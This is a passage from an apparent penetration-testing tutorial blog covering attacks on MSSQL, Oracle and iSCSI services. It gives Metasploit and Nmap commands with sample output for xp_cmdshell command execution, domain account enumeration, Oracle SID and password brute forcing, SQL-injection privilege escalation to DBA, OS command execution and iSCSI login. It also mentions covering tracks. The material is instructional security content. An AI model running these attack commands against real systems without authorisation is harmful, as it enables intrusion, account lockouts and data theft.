</span><span class='line'>[*]   xp_regread
</span><span class='line'>[*]   sp_getbindtoken
</span><span class='line'>[*]   sp_replincrementlsn
</span><span class='line'>[*] Instances found on this server:
</span><span class='line'>[*]   MSSQLSERVER
</span><span class='line'>[*]   SQLEXPRESS
</span><span class='line'>[*] Default Server Instance SQL Server Service is running under the privilege of:
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*] Instance SQLEXPRESS SQL Server Service is running under the privilege of:
</span><span class='line'>[*]   NT AUTHORITY\NETWORKSERVICE
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Next, we can execute command using <strong>Microsoft SQL Server xp_cmdshell Command Execution</strong> if xp_cmdshell is enabled and if the user has permissions.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_exec
</span><span class='line'>set RHOst 10.10.xx.xx
</span><span class='line'>set password company@123
</span><span class='line'>set cmd ipconfig</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Windows IP Configuration
</span><span class='line'> 
</span><span class='line'> 
</span><span class='line'> Ethernet adapter LAN:
</span><span class='line'> 
</span><span class='line'>    Connection-specific DNS Suffix  . : 
</span><span class='line'>    IPv4 Address. . . . . . . . . . . : 10.10.xx.xx
</span><span class='line'>    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
</span><span class='line'>    Default Gateway . . . . . . . . . : 10.10.xx.xx
</span><span class='line'> 
</span><span class='line'> Ethernet adapter Local Area Connection 3:
</span><span class='line'> 
</span><span class='line'>    Connection-specific DNS Suffix  . : 
</span><span class='line'>    Link-local IPv6 Address . . . . . : fe80::798f:6cad:4f1e:c5fb%15
</span><span class='line'>    Autoconfiguration IPv4 Address. . : 169.254.xx.xx
</span><span class='line'>    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
</span><span class='line'>    Default Gateway . . . . . . . . . : 
</span><span class='line'> 
</span><span class='line'> Tunnel adapter isatap.{D295B095-19EB-436E-97D0-4D22486521CC}:
</span><span class='line'> 
</span><span class='line'>    Media State . . . . . . . . . . . : Media disconnected
</span><span class='line'>    Connection-specific DNS Suffix  . : 
</span><span class='line'> 
</span><span class='line'> Tunnel adapter isatap.{A738E25A-F5E3-4E36-8F96-6977E22136B6}:
</span><span class='line'> 
</span><span class='line'>    Media State . . . . . . . . . . . : Media disconnected
</span><span class='line'>    Connection-specific DNS Suffix  . : </span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>Scott Sutherland has written four parts of <strong>Hacking SQL Servers</strong>:  ( A must-read )</p>

<ol>
<li>
<a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/">Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases</a> : how database users commonly created for web applications can be used to escalate privileges in SQL Server when database ownership is poorly configured. Corresponding Metasploit module is Microsoft SQL Server Escalate Db_Owner 'mssql_escalate_dbowner'.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/">Hacking SQL Server Stored Procedures – Part 2: User Impersonation</a>   : provides a lab guide and attack walk-through that can be used to gain a better understanding of how the IMPERSONATE privilege can lead to privilege escalation in SQL Server. Corresponding Metasploit module is Microsoft SQL Server Escalate EXECUTE AS 'mssql_escalate_execute_as'.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">Hacking SQL Server Stored Procedures – Part 3: SQL Injection</a>   : This blog covers how SQL injection can be identified and exploited to escalate privileges in SQL Server stored procedures when they are configured to execute with higher privileges using the WITH EXECUTE AS clause or certificate signing.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">Hacking SQL Server Procedures – Part 4: Enumerating Domain Accounts</a> : shows enumerate Active Directory domain users, groups, and computers through native SQL Server functions using logins that only have the Public server role (everyone). I’ll also show how to enumerate SQL Server logins using a similar technique. Corresponding module is <strong>Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_enum_domain_accounts
</span><span class='line'>set rhost 10.10.xx.xx
</span><span class='line'>set password company@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Attempting to connect to the database server at 10.10.xx.xx:1433 as sa...
</span><span class='line'>[+] Connected.
</span><span class='line'>[*] SQL Server Name: EXAMPLECRM1
</span><span class='line'>[*] Domain Name: EXAMPLE
</span><span class='line'>[+] Found the domain sid: 01050000000000051500000016c0ea32f450ba7443170a32
</span><span class='line'>[*] Brute forcing 10000 RIDs through the SQL Server, be patient...
</span><span class='line'>[*]  - EXAMPLE\administrator
</span><span class='line'>[*]  - EXAMPLE\Guest
</span><span class='line'>[*]  - EXAMPLE\krbtgt
</span><span class='line'>[*]  - EXAMPLE\Domain Admins
</span><span class='line'>[*]  - EXAMPLE\Domain Users
</span><span class='line'>[*]  - EXAMPLE\Domain Guests
</span><span class='line'>[*]  - EXAMPLE\Domain Computers
</span><span class='line'>[*]  - EXAMPLE\Domain Controllers
</span><span class='line'>[*]  - EXAMPLE\Cert Publishers
</span><span class='line'>[*]  - EXAMPLE\Schema Admins
</span><span class='line'>[*]  - EXAMPLE\Enterprise Admins
</span><span class='line'>[*]  - EXAMPLE\Group Policy Creator Owners
</span><span class='line'>[*]  - EXAMPLE\Read-only Domain Controllers
</span><span class='line'>[*]  - EXAMPLE\RAS and IAS Servers
</span><span class='line'>[*]  - EXAMPLE\Allowed RODC Password Replication Group
</span><span class='line'>[*]  - EXAMPLE\Denied RODC Password Replication Group
</span><span class='line'>[*]  - EXAMPLE\TsInternetUser</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p>Other fun modules to check are</p>

<ol>
<li> <strong>Microsoft SQL Server Find and Sample Data</strong>: This script will search through all of the non-default databases on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS option. If column names are found that match the defined keywords and data is present in the associated tables, the script will select a sample of the records from each of the affected tables. The sample size is determined by the SAMPLE_SIZE option, and results output in a CSV format.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_findandsampledata </span></code></pre></td></tr></table></div></figure>
</li>
<li>
<strong>Microsoft SQL Server Generic Query</strong>: This module will allow for simple SQL statements to be executed against a MSSQL/MSDE instance given the appropiate credentials.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_sql</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>MSSQL Schema Dump</strong>: This module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master,model,msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mssql/mssql_schemadump</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>We can also use</p>

<ol>
<li>
<strong>tsql command</strong>, install it by using freetds-bin package and use it like
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tsql -H 10.10.xx.xx -p 1433 -U sa -P company@123
</span><span class='line'>locale is "en_IN"
</span><span class='line'>locale charset is "UTF-8"
</span><span class='line'>using default charset "UTF-8"
</span><span class='line'>1&gt; SELECT suser_sname(owner_sid)
</span><span class='line'>2&gt; FROM sys.databases
</span><span class='line'>3&gt; go
</span><span class='line'>
</span><span class='line'>sa
</span><span class='line'>sa
</span><span class='line'>sa
</span><span class='line'>sa
</span><span class='line'>EXAMPLE\administrator
</span><span class='line'>EXAMPLE\administrator
</span><span class='line'>EXAMPLE\kuanxxxx
</span><span class='line'>(7 rows affected)</span></code></pre></td></tr></table></div></figure>
See examples for Scott blogs, how to execute queries.
</li>
<li>We can also use <strong>Microsoft SQL Server Management</strong> to connect to Remote Database.</li>
</ol>


<h3>Oracle | Port 1521</h3>

<p>After setting up oracle with metasploit here <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">How to get Oracle Support working with Kali Linux</a>  We will directly follow the procedure presented by Chris Gates <a href="http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf">here</a>.</p>

<p><strong>Oracle Attack Methodology</strong>
We need 4 things to connect to an Oracle DB.</p>

<ol>
<li>IP.</li>
<li>Port.</li>
<li>Service Identifier (SID).</li>
<li>Username/Password.</li>
</ol>


<ol>
<li><strong>Locate Oracle Systems</strong>: Nmap would probably be the best tool to find the oracle instances.</li>
<li><strong>Determine Oracle Version</strong>: Metasploit has 
<ul>
<li><strong>Oracle TNS Listener Service Version Query</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/tnslsnr_version 
</span><span class='line'>services -p 1521 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:1521 Oracle - Version: 64-bit Windows: Version 11.1.0.7.0 - Production
</span><span class='line'>[-] 10.10.xx.xx:1521 Oracle - Version: Unknown - Error code 1189 - The listener could not authenticate the user
</span><span class='line'>[-] 10.10.xx.xx:1521 Oracle - Version: Unknown
</span><span class='line'>[*] Scanned  8 of 12 hosts (66% complete)
</span><span class='line'>[+] 10.10.xx.xx:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production</span></code></pre></td></tr></table></div></figure>
</li>
</ul> </li>
<li><strong>Determine Oracle SID</strong>: Oracle Service Identifier: By querying the TNS Listener directly, brute force for default SID's or query other components that may contain it. 
<br>
<br>
<strong>Metasploit</strong> has 
<ul>
<li><strong>Oracle TNS Listener SID Enumeration</strong>: This module simply queries the TNS listner for the Oracle SID. With Oracle 9.2.0.8 and above the listener will be protected and the SID will have to be bruteforced or guessed.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/sid_enum</span></code></pre></td></tr></table></div></figure>
</li>
<li>
<strong>Oracle TNS Listener SID Bruteforce</strong>:   This module queries the TNS listner for a valid Oracle database instance name (also known as a SID). Any response other than a "reject" will be considered a success. If a specific SID is provided, that SID will be attempted. Otherwise, SIDs read from the named file will be attempted in sequence instead.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/sid_brute</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.140.200.163:1521   -  - Oracle - Checking 'SA0'...
</span><span class='line'>[*] 10.140.200.163:1521   -  - Oracle - Refused 'SA0'
</span><span class='line'>[*] 10.140.200.163:1521   -  - Oracle - Checking 'PLSEXTPROC'...
</span><span class='line'>[+] 10.140.200.163:1521   - 10.140.200.163:1521 Oracle - 'PLSEXTPROC' is valid
</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
<strong>Nmap</strong> has:
<ul>
<li>
<a href="https://nmap.org/nsedoc/scripts/oracle-sid-brute.html">Oracle-sid-brute</a>: Guesses Oracle instance/SID names against the TNS-listener.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script=oracle-sid-brute --script-args=oraclesids=/path/to/sidfile -p 1521-1560 &lt;host&gt;
</span><span class='line'>nmap --script=oracle-sid-brute -p 1521-1560 &lt;host&gt;</span></code></pre></td></tr></table></div></figure>
</li></ul>
A good white paper on guessing the Service Identifier is <a href="http://www.dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf">Different ways to guess Oracle database SID</a></li>
<li><strong>Guess/Bruteforce USER/PASS</strong>:
Once we know the service identifier, we need to find out a valid username and password..

<strong>Metasploit</strong> has
<ul>
<li><strong>Oracle RDBMS Login Utility</strong>: It actually runs nmap in the background, requires RHOSTS, RPORTS, SID to test the default usernames and passwords.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/oracle_login</span></code></pre></td></tr></table></div></figure></li>
</ul>

<strong>Nmap</strong> has 
<ul><li><a href="https://nmap.org/nsedoc/scripts/oracle-brute.html">Oracle-brute</a>:Performs brute force password auditing against Oracle servers. Running it in default mode it performs an audit against a list of common Oracle usernames and passwords. The mode can be changed by supplying the argument oracle-brute.nodefault at which point the script will use the username- and password- lists supplied with Nmap. The script makes no attempt to discover the amount of guesses that can be made before locking an account. Running this script may therefor result in a large number of accounts being locked out on the database server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL &lt;host&gt;</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/oracle-brute-stealth.html">oracle-brute-stealth</a>: Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's O5LOGIN authentication scheme. The vulnerability exists in Oracle 11g R1/R2 and allows linking the session key to a password hash. When initiating an authentication attempt as a valid user the server will respond with a session key and salt. Once received the script will disconnect the connection thereby not recording the login attempt. The session key and salt can then be used to brute force the users password.
<br>
<br>
CVE-2012-3137: The authentication protocol in Oracle Database Server 10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, and 11.2.0.3 allows remote attackers to obtain the session key and salt for arbitrary users, which leaks information about the cryptographic hash and makes it easier to conduct brute force password guessing attacks, aka "stealth password cracking vulnerability.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL &lt;host&gt;</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/oracle-enum-users.html">Oracle-enum-users</a>:Attempts to enumerate valid Oracle user names against unpatched Oracle 11g servers (this bug was fixed in Oracle's October 2009 Critical Patch Update).
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 &lt;host&gt;</span></code></pre></td></tr></table></div></figure>
</li></ul>
</li>
<li>Privilege Escalation via SQL Injection:
<ul>
<li>lt_findricset.rb</li>
<li>lt_findricset_cursor.rb: Oracle DB SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.LT.FINDRICSET package via Evil Cursor technique. Tested on oracle 10.1.0.3.0 -- should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/sqli/oracle/lt_findricset_cursor</span></code></pre></td></tr></table></div></figure></li>
<li>dbms_metadata_open.rb: Oracle DB SQL Injection via SYS.DBMS_METADATA.OPEN:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS_METADATA.OPEN package/function.</li>
<li>dbms_cdc_ipublish: Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE:   The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE procedure of the PL/SQL package 
  DBMS_CDC_IPUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions:  Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.
</li>
<li>dbms_cdc_publish: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE: The module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE procedure of the PL/SQL package 
  DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions: 
  Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU. </li>
<li>dbms_cdc_publish2: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE: The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with 
  execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</li>
<li>dbms_cdc_publish3: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET: The module exploits an sql injection flaw in the CREATE_CHANGE_SET procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with 
  execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</li>
<li>dbms_cdc_subscribe_activate_subscription: Oracle DB SQL Injection via SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION: This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the 
  SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION package/function. This vulnerability affects to Oracle Database Server 9i up to 9.2.0.5 and 10g up to 10.1.0.4.</li>
<li>lt_compressworkspace.rb: Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE:   This module exploits an sql injection flaw in the COMPRESSWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute 
  privilege on the vulnerable package can exploit this vulnerability.</li>
<li>lt_mergeworkspace.rb: Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE:   This module exploits an sql injection flaw in the MERGEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
<li>lt_removeworkspace.rb: Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE:   This module exploits an sql injection flaw in the REMOVEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability. </li>
<li>lt_rollbackworkspace.rb: Oracle DB SQL Injection via SYS.LT.ROLLBACKWORKSPACE:   This module exploits an sql injection flaw in the ROLLBACKWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
</ul></li>
<li>Manipulate Data/Post Exploitation:
The above privilege escalation exploits will provide us DBA access, from where we can access the data. We can use 
<ul>
<li>Metasploit oracle_sql: Oracle SQL Generic Query: This module allows for simple SQL statements to be executed against a Oracle instance given the appropriate credentials and sid.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/oracle/oracle_sql</span></code></pre></td></tr></table></div></figure></li>
or you can directly connect to the database using
<li>SQLPlus
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlplus username/password@host:port/service</span></code></pre></td></tr></table></div></figure>
or use tnsnames.ora file to connect to the database. For that edit it and add a new entry: This file normally resides in the $ORACLE HOME\NETWORK\ADMIN directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>myDb  =
</span><span class='line'> (DESCRIPTION =
</span><span class='line'>   (ADDRESS_LIST =
</span><span class='line'>     (ADDRESS = (PROTOCOL = TCP)(Host = c)(Port =a))
</span><span class='line'>   )
</span><span class='line'> (CONNECT_DATA =
</span><span class='line'>   (SERVICE_NAME =b)
</span><span class='line'> )
</span><span class='line'>)</span></code></pre></td></tr></table></div></figure>
and then you could connect to the db:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlplus x/y@myDb</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
However, there's more to Post Exploitation which are OS Shells. There are multiple methods for running OS commands via oracle libraries.
<ul>
<li>Via Java: 

There's a metasploit
<ul>
<li>win32exec: Oracle Java execCommand (Win32):   This module will create a java class which enables the execution of OS commands. First, we need to grant the user privileges of JAVASYSPRIVS using oracle_sql module
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/oracle/post_exploitation/win32exec</span></code></pre></td></tr></table></div></figure></li>
</ul>
This can also be done by executing SQL Scripts provided by oracle. For more information refer <a href="http://www.oracle.com/technetwork/database/enterprise-edition/calling-shell-commands-from-plsql-1-1-129519.pdf">Executing operating system commands from PL/ SQL.</a>
</li>
<li>Extproc backdoors</li>
<li>DBMS_Scheduler</li>
<li>Run custom pl/sql or java</li>
</ul></li>
<li>Cover Tracks.<li>
</ol>


<p><strong>Metasploit</strong> has</p>

<p><ol></p>

<p><li>
We can use <strong>Oracle TNS Listener Checker</strong> which module checks the server for vulnerabilities like TNS Poison.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/tnspoison_checker
</span><span class='line'>services -p 1521 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:1521 is vulnerable
</span><span class='line'>[+] 10.10.xx.xx:1521 is vulnerable
</span><span class='line'>[*] Scanned  2 of 12 hosts (16% complete)
</span><span class='line'>[-] 10.10.xx.xx:1521 is not vulnerable </span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li></p>

<p>Some SQL statements which could be executed after SQL Plus connection:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1. select * from global_name
</span><span class='line'>2. </span></code></pre></td></tr></table></div></figure></p>

<p>A good blog to secure oracle is <a href="http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html">Top 10 Oracle Steps to a Secure Oracle Database Server</a>
</li></p>

<h3>ISCSI | Port 3260</h3>

<p>Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. A good article is <a href="https://pig.made-it.com/iSCSI.html">SCSI over IP</a>
<br>
<br>
<strong>Nmap</strong> has</p>

<p><ol>
<li><a href="https://nmap.org/nsedoc/scripts/iscsi-info.html">iscsi-info.nse</a>: Collects and displays information from remote iSCSI targets.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV -p 3260 192.168.xx.xx &ndash;script=iscsi-info
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-05-04 14:50 IST
</span><span class='line'>Nmap scan report for 192.168.xx.xx
</span><span class='line'>Host is up (0.00064s latency).
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>3260/tcp open  iscsi?
</span><span class='line'>| iscsi-info:
</span><span class='line'>|   iqn.1992-05.com.emc:fl1001433000190000-3-vnxe:
</span><span class='line'>|     Address: 192.168.xx.xx:3260,1
</span><span class='line'>|_    Authentication: NOT required
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 138.09 seconds</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>Hacking Team DIY shows to run</p>

<p><ol>
<li> We can discover the target IP address by using the below command
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m discovery -t sendtargets -p 192.168.xx.xx
</span><span class='line'>192.168.xx.xx:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe</span></code></pre></td></tr></table></div></figure>
</li>
<li> Login via
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m node &ndash;targetname=&ldquo;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&rdquo; -l -p 192.168.xx.xx &ndash;login -
</span><span class='line'>Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] (multiple)
</span><span class='line'>Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.</span></code></pre></td></tr></table></div></figure></li></p>

<p><li> Failed Result: When we login, ideally we should be able to see the location, however for some strange reason we didn&rsquo;t got that here.
